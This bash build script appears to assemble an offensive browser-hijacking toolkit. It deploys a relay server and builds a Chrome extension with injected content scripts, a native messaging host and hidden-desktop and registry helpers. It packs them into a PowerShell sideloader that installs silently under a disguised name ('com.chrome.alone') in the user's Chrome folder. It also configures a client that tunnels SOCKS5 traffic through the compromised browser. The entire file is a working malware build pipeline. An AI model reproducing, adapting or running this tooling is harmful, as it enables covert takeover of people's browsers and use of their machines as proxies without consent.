#!/bin/bash
set -e

# Parse command line arguments
DOMAIN_NAME=""
APP_NAME="com.chrome.alone"
OUTPUT_NAME="sideloader.ps1"
TFVARS_FILE=""

# Function to display usage information
show_usage() {
  echo "Usage: $0 [--domain=example.com] [--appname=com.chrome.alone] [--output=sideloader.ps1] [--tfvars=path/to/terraform.tfvars]"
  echo ""
  echo "Arguments:"
  echo "  --domain=DOMAIN    Domain name for the relay server (required unless --tfvars is provided)"
  echo "  --appname=NAME     Custom app name (optional, default: com.chrome.alone)"
  echo "  --output=NAME      Output file name (optional, default: sideloader.ps1)"
  echo "  --tfvars=PATH      Path to existing terraform.tfvars file (skips terraform deployment)"
  echo ""
}

# Parse arguments
while [[ $# -gt 0 ]]; do
  case $1 in
    --domain=*)
      DOMAIN_NAME="${1#*=}"
      shift
      ;;
    --appname=*)
      APP_NAME="${1#*=}"
      shift
      ;;
    --output=*)
      OUTPUT_NAME="${1#*=}"
      shift
      ;;
    --tfvars=*)
      TFVARS_FILE="${1#*=}"
      shift
      ;;
    --help|-h)
      show_usage
      exit 0
      ;;
    *)
      # Unknown option
      echo "Unknown option: $1"
      show_usage
      exit 1
      ;;
  esac
done

# Check if domain is provided or tfvars file is specified
if [ -z "$DOMAIN_NAME" ] && [ -z "$TFVARS_FILE" ]; then
  echo "Error: Either domain name or tfvars file path is required"
  show_usage
  exit 1
fi

# If tfvars file is provided, validate it exists
if [ -n "$TFVARS_FILE" ] && [ ! -f "$TFVARS_FILE" ]; then
  echo "Error: TFVARs file not found: $TFVARS_FILE"
  exit 1
fi

if [ -n "$TFVARS_FILE" ]; then
  echo "Using existing TFVARs file: $TFVARS_FILE"
else
  echo "Domain Name: $DOMAIN_NAME"
fi
echo "App Name: ${APP_NAME:-Using default com.chrome.alone}"
echo "Output Name: ${OUTPUT_NAME:-Using default sideloader.ps1}"

# Function to check if a command exists
command_exists() {
  command -v "$1" >/dev/null 2>&1
}

# Check for required dependencies
echo "Checking for required dependencies..."
MISSING_DEPS=0

for cmd in aws terraform npm node dotnet python3; do
  if ! command_exists $cmd; then
    echo "Error: $cmd is not installed or not in PATH"
    MISSING_DEPS=1
  fi
done

if [ $MISSING_DEPS -eq 1 ]; then
  echo "Please install missing dependencies or use the Docker container"
  exit 1
fi

# Determine if we're in Docker or on local machine
if [ -d "/project" ] && [ "$(pwd)" = "/home/builder" ]; then
  # We're in Docker, change to the mounted project directory
  echo "Running in Docker container, changing to project directory..."
  cd /project
else
  # We're on a local machine, use current directory
  echo "Running on local machine, using current directory..."
fi

# Store the project root directory
PROJECT_ROOT=$(pwd)
echo "Project root: $PROJECT_ROOT"

# Step 1: Deploy relay (skip if tfvars file provided)
if [ -n "$TFVARS_FILE" ]; then
  echo "Step 1: Skipping terraform deployment (using provided TFVARs file)"
  # Copy the provided tfvars file to the expected location
  mkdir -p "$PROJECT_ROOT/output/relay-deployment"
  DEST_TFVARS="$PROJECT_ROOT/output/relay-deployment/terraform.tfvars"
  
  # Check if source and destination are the same file to avoid cp error
  if [ "$TFVARS_FILE" -ef "$DEST_TFVARS" ]; then
    echo "TFVARs file is already in the correct location"
  else
    cp "$TFVARS_FILE" "$DEST_TFVARS"
    echo "Copied TFVARs file to $DEST_TFVARS"
  fi
else
  echo "Step 1: Running .deploy-relay.sh from BATTLEPLAN/ directory"
  cd "$PROJECT_ROOT/BATTLEPLAN"
  bash ./deploy-relay.sh --domain "$DOMAIN_NAME"
fi

# Extract domain_name and relay_token from terraform.tfvars
TFVARS_PATH="$PROJECT_ROOT/output/relay-deployment/terraform.tfvars"
if [ ! -f "$TFVARS_PATH" ]; then
  echo "Error: terraform.tfvars file not found at $TFVARS_PATH"
  exit 1
fi

# Extract values using grep and sed
echo "Extracting configuration from terraform.tfvars..."
EXTRACTED_DOMAIN=$(grep 'domain_name' "$TFVARS_PATH" | sed 's/domain_name = "\(.*\)"/\1/')
EXTRACTED_TOKEN=$(grep 'relay_token' "$TFVARS_PATH" | sed 's/relay_token = "\(.*\)"/\1/')

if [ -z "$EXTRACTED_DOMAIN" ] || [ -z "$EXTRACTED_TOKEN" ]; then
  echo "Error: Could not extract domain_name or relay_token from terraform.tfvars"
  exit 1
fi

echo "Extracted domain: $EXTRACTED_DOMAIN"
echo "Extracted token: ${EXTRACTED_TOKEN:0:8}..." # Only show first 8 chars for security

# Create .env file for webpack
ENV_FILE="$PROJECT_ROOT/BLOWTORCH/.env"
echo "Creating .env file for webpack at $ENV_FILE"
cat > "$ENV_FILE" << EOF
WS_DOMAIN=$EXTRACTED_DOMAIN
RELAY_TOKEN=$EXTRACTED_TOKEN
EOF

# Step 2: Install npm dependencies
echo "Step 2: Running npm install"
cd "$PROJECT_ROOT/BLOWTORCH"
npm install

# Step 2a: Generate IWA signing keys
if [ ! -f "cert.pem" ] || [ ! -f "private.key" ]; then
  echo "Generating IWA signing keys..."
  npm run generate-keys
fi

# Step 3: Build the IWA extension in Prod mode
echo "Step 3: Running npm run build:prod"
# The .env file will be used by webpack.config.cjs
npm run build:prod

# Step 3a move signed web bundle to the output folder
mkdir -p "$PROJECT_ROOT/output/iwa"
mv "$PROJECT_ROOT/BLOWTORCH/dist/app.swbn" "$PROJECT_ROOT/output/iwa/app.swbn"
rm -rf "$PROJECT_ROOT/BLOWTORCH/dist"
rm $ENV_FILE

# Step 4: Build the extension
echo "Step 4: Building the extension"
cd "$PROJECT_ROOT"

# Step 4a: Copy the extension files
cp -r ./HOTWHEELS/extension/ ./output/extension/
cp ./PAINTBUCKET/ContentScriptInject/*.js ./output/extension/

# Step 4b: Build the WASM files
GOOS=js GOARCH=wasm go build -trimpath -ldflags "-s -w" -o ./output/extension/wasm/main.wasm ./HOTWHEELS/wasm/content-script/
GOOS=js GOARCH=wasm go build -trimpath -ldflags "-s -w -X main.EXTENSION_NAME=$APP_NAME" -o output/extension/wasm/background.wasm ./HOTWHEELS/wasm/background-script/

# Step 4c: build the native messaging host
dotnet build -c Release -r win-x64 -o output/extension/ ./DOORKNOB/ExtensionSideloader/dotnet/NativeAppHost/NativeAppHost.csproj

# Step 4d: Build our support dotnet libraries
cd "$PROJECT_ROOT/DOORKNOB/IWASideloader/RegHelper"
dotnet build -c Release -r win-x64 .
cd "$PROJECT_ROOT/DOORKNOB/IWASideloader/HiddenDesktopNative"
dotnet build -c Release -r win-x64 .

# Step 5: Create sideloaders
echo "Step 5: Creating sideloaders"

# Step 5a: Create IWA Sideloader
cd "$PROJECT_ROOT"

echo "Using APP_NAME: $APP_NAME"

# Create sideloader with appropriate arguments
python3 ./DOORKNOB/IWASideloader/createSideloader.py ./output/iwa/app.swbn --appname="$APP_NAME" --output=./output/iwa-sideloader.ps1

# Step 5b: Create Chrome Sideloader
python3 ./DOORKNOB/ExtensionSideloader/powershell/build_sideloader.py ./output/extension "%LOCALAPPDATA%\Google\\$APP_NAME" --output=./output/extension-sideloader.ps1

# Step 5c: Create combined sideloader script:
echo "Creating combined sideloader script..."

# Determine the actual APP_NAME being used (same logic as the individual sideloaders)
ACTUAL_APP_NAME="${APP_NAME:-com.chrome.alone}"
echo "Using APP_NAME: $ACTUAL_APP_NAME for combined sideloader"

# Create the combined script header with unified parameters
cat > ./output/sideloader.ps1 << EOF
# Combined Chrome Extension and IWA Sideloader Script
# This script can install Chrome Extension, IWA, or both

param(
    [string]\$Mode = "both",  # "extension", "iwa", or "both"
    [string]\$APP_NAME = "$ACTUAL_APP_NAME",
    [string]\$ExtensionInstallDir = "%LOCALAPPDATA%\Google\\$ACTUAL_APP_NAME",
    [string]\$ExtensionDescription = "Chrome Extension",
    [string]\$InstallNativeMessagingHost = "false",
    [string]\$ForceRestartChrome = "false"
)

Write-Host "Combined Chrome Extension and IWA Sideloader" -ForegroundColor Cyan
Write-Host "Mode: \$Mode" -ForegroundColor Yellow
Write-Host "APP_NAME: '\$APP_NAME'" -ForegroundColor Yellow
Write-Host "APP_NAME Length: \$(\$APP_NAME.Length)" -ForegroundColor Yellow

EOF

# Add extension sideloader functions (remove param block and execution logic)
echo "# === EXTENSION SIDELOADER FUNCTIONS ===" >> ./output/sideloader.ps1
sed '/^param(/,/^)$/d; /^# Run the main function only/,$d' ./output/extension-sideloader.ps1 >> ./output/sideloader.ps1

# Add IWA sideloader content (wrap in function)
echo "" >> ./output/sideloader.ps1
echo "# === IWA SIDELOADER FUNCTIONS ===" >> ./output/sideloader.ps1
echo "function Install-IWA {" >> ./output/sideloader.ps1

# Set APP_NAME locally within the function
echo '    $env:APP_NAME = $APP_NAME' >> ./output/sideloader.ps1
echo "" >> ./output/sideloader.ps1

# Extract the IWA installation logic (after the bundleData definition, skip original APP_NAME line)
sed -n '/^\$bundleData = @"/,/^"@$/p' ./output/iwa-sideloader.ps1 >> ./output/sideloader.ps1
sed -n '/^"@$/,$p' ./output/iwa-sideloader.ps1 | tail -n +2 | sed '/^\$env:APP_NAME/d' >> ./output/sideloader.ps1

echo "}" >> ./output/sideloader.ps1

# Add main execution logic
cat >> ./output/sideloader.ps1 << 'EOF'

# === MAIN EXECUTION LOGIC ===
try {
    # Resolve the ExtensionInstallDir with APP_NAME substitution
    $ExtensionInstallDir = $ExtensionInstallDir -replace '\$APP_NAME', $APP_NAME
    
    if ($Mode -eq "extension" -or $Mode -eq "both") {
        Write-Host "`nInstalling Chrome Extension..." -ForegroundColor Green
        Write-Host "Extension install directory: $ExtensionInstallDir" -ForegroundColor Yellow
        Main  # Call the extension installation function
    }

    if ($Mode -eq "iwa" -or $Mode -eq "both") {
        Write-Host "`nInstalling IWA..." -ForegroundColor Green
        Install-IWA  # Call the IWA installation function
    }

    Write-Host "`nInstallation completed successfully!" -ForegroundColor Green
} catch {
    Write-Error "Installation failed: $($_.Exception.Message)"
    exit 1
}
EOF

echo "Combined sideloader script created successfully"

# Step 6: Configure Relay Agent Webapp:
echo "Step 6: Configuring Relay Agent Webapp"

# Step 6a: Copy client files to output directory
echo "Step 6a: Copying client files to output/client/"
mkdir -p "$PROJECT_ROOT/output/client"
cp -r "$PROJECT_ROOT/BATTLEPLAN/client/"* "$PROJECT_ROOT/output/client/"

# Step 6b: Extract configuration and update config.js
echo "Step 6b: Updating config.js with relay configuration"

# Extract values from TFVARs file format
RELAY_HOST=$(grep 'domain_name' "$TFVARS_PATH" | sed 's/domain_name = "\(.*\)"/\1/')
RELAY_PORT="1080"  # Default SOCKS5 port
RELAY_USERNAME=$(grep 'proxy_user' "$TFVARS_PATH" | sed 's/proxy_user = "\(.*\)"/\1/')
RELAY_PASSWORD=$(grep 'proxy_pass' "$TFVARS_PATH" | sed 's/proxy_pass = "\(.*\)"/\1/')

# Validate extracted values
if [ -z "$RELAY_HOST" ] || [ -z "$RELAY_PORT" ] || [ -z "$RELAY_USERNAME" ] || [ -z "$RELAY_PASSWORD" ]; then
  echo "Error: Could not extract all required values from terraform.tfvars"
  echo "Host: $RELAY_HOST, Port: $RELAY_PORT, Username: $RELAY_USERNAME"
  echo "Make sure the tfvars file contains: domain_name, proxy_user, and proxy_pass"
  exit 1
fi

echo "Updating config.js with extracted values:"
echo "  Host: $RELAY_HOST"
echo "  Port: $RELAY_PORT"
echo "  Username: $RELAY_USERNAME"
echo "  Password: ${RELAY_PASSWORD:0:8}..." # Only show first 8 chars for security

# Update config.js with extracted values
CONFIG_JS_FILE="$PROJECT_ROOT/output/client/config.js"
# Escape special characters in the values for sed
RELAY_HOST_ESCAPED=$(printf '%s\n' "$RELAY_HOST" | sed 's/[[\.*^$()+?{|]/\\&/g')
RELAY_PORT_ESCAPED=$(printf '%s\n' "$RELAY_PORT" | sed 's/[[\.*^$()+?{|]/\\&/g')
RELAY_USERNAME_ESCAPED=$(printf '%s\n' "$RELAY_USERNAME" | sed 's/[[\.*^$()+?{|]/\\&/g')
RELAY_PASSWORD_ESCAPED=$(printf '%s\n' "$RELAY_PASSWORD" | sed 's/[[\.*^$()+?{|]/\\&/g')

sed -i.backup \
  -e "s|defaultHost: \"[^\"]*\"|defaultHost: \"$RELAY_HOST_ESCAPED\"|" \
  -e "s|defaultPort: \"[^\"]*\"|defaultPort: \"$RELAY_PORT_ESCAPED\"|" \
  -e "s|defaultUsername: \"[^\"]*\"|defaultUsername: \"$RELAY_USERNAME_ESCAPED\"|" \
  -e "s|defaultPassword: \"[^\"]*\"|defaultPassword: \"$RELAY_PASSWORD_ESCAPED\"|" \
  "$CONFIG_JS_FILE"

# Remove backup file
rm -f "$CONFIG_JS_FILE.backup"

echo "Step 6: Client configuration completed successfully"

echo "Build completed successfully! Interact with your extension relay by opening output/client/index.html"